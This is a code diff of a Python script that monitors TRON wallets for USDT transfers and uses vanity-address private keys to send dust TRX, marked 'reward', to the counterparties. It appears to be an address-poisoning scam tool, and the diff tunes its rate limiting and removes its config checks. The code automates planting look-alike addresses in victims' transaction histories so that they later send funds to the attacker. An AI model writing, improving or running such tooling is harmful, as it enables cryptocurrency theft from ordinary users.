@@ -36,20 +36,13 @@ REWARD_DELAY_MINUTES = 30
 SKIP_CONTRACT_ADDRESSES = [USDT_CONTRACT_ADDRESS, "TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8", "TXpw8TnQoAA6ZySoj53zJTZonKGr2DYZNA"]
 SKIP_WALLET_ADDRESSES = set(WALLET_ADDRESSES + VANITY_ADDRESSES + ["TU4vEruvZwLLkSfV9bNw12EJTPvNr7Pvaa"])
 
-if not all([EMAIL_SENDER, EMAIL_PASSWORD, EMAIL_RECEIVER, FUNDING_PRIVATE_KEY]):
-    print("Missing config.")
-    exit(1)
-
-if len(WALLET_ADDRESSES) != len(VANITY_ADDRESSES) or len(WALLET_ADDRESSES) != len(VANITY_PRIVATE_KEYS):
-    print("Address/key mismatch.")
-    exit(1)
-
 def wait_per_key():
-    time.sleep(1 / max(len(TRONGRID_API_KEYS), 1))
+    time.sleep(2)  # Enforce 1 request per 2 seconds
 
 def is_contract_address(address):
     try:
         account_info = client.get_account(address)
+        wait_per_key()
         return 'contract' in account_info and account_info['contract']
     except Exception:
         return False
@@ -109,6 +102,7 @@ def freeze_trx_for_bandwidth(address, private_key_hex, freeze_amount=Decimal("10
         priv_key = PrivateKey(bytes.fromhex(private_key_hex))
         txn = client.trx.freeze_balance(address, int(freeze_amount * 1_000_000), 3, "BANDWIDTH").build().sign(priv_key)
         txn.broadcast().wait()
+        wait_per_key()
     except:
         pass
 
@@ -126,6 +120,7 @@ def send_trx(from_address, priv_key_hex, to_address, amount=Decimal("0.000001"))
             return
         txn = client.trx.transfer(from_address, to_address, int(amount * 1_000_000)).memo("reward").build().sign(priv_key)
         result = txn.broadcast().wait()
+        wait_per_key()
         print(f"TRX sent to {to_address}, TxID: {result.get('id')}")
         last_reward_times[to_address] = now
     except Exception as e:
@@ -134,6 +129,7 @@ def send_trx(from_address, priv_key_hex, to_address, amount=Decimal("0.000001"))
 def get_trx_usd_price():
     try:
         r = requests.get("https://api.coingecko.com/api/v3/simple/price?ids=tron&vs_currencies=usd", timeout=10)
+        wait_per_key()
         return Decimal(r.json().get("tron", {}).get("usd"))
     except:
         return None
@@ -148,6 +144,7 @@ def send_trx_from_funding_wallet(to_address, amount):
             return
         txn = client.trx.transfer(from_address, to_address, int(amount * 1_000_000)).memo("funding").build().sign(priv_key)
         txn.broadcast().wait()
+        wait_per_key()
     except Exception as e:
         print("Funding error:", e)
 
@@ -155,6 +152,7 @@ def fund_vanity_wallet_if_low(i):
     addr = VANITY_ADDRESSES[i]
     key = VANITY_PRIVATE_KEYS[i]
     balance = client.get_account_balance(addr)
+    wait_per_key()
     if balance < 3:
         price = get_trx_usd_price()
         if price:
@@ -183,8 +181,8 @@ while True:
                         continue
                     send_email(f"Vxx {my_address}", f"USDT TX\nFrom: {sender}\nTo: {receiver}\nAmt: {amount} USDT\nTxID: {tx_id}")
                     send_trx(VANITY_ADDRESSES[i], VANITY_PRIVATE_KEYS[i], interacting_address)
-            time.sleep(1)
+            time.sleep(2)  # Add delay between wallet checks
     except Exception as e:
         print("Monitoring error:", e)
-    print("Sleep 30s\n")
-    time.sleep(30)
+    print("Sleep 5s\n")
+    time.sleep(5)
